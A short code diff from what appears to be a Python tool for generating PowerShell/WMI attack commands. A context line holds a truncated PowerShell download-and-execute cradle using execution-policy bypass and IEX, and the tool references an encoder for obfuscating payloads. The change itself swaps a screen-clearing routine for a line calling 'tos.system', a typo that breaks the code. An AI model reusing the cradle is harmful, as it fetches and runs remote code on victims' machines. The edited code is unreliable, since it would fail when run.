@@ -21,10 +21,7 @@ run_execute = "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).Downlo
 
 print "PowerShell/WMI Generator"
 def clear():
-	try:
-		sp.call('cls',shell=True)
-	except:
-		sp.call('clear',shell=True)
+	tos.system('cls' if os.name == 'nt' else 'clear')
 def powershell_encode(data):
 	#https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py
 	#Carlos - aka Darkoperator wrote the code below:
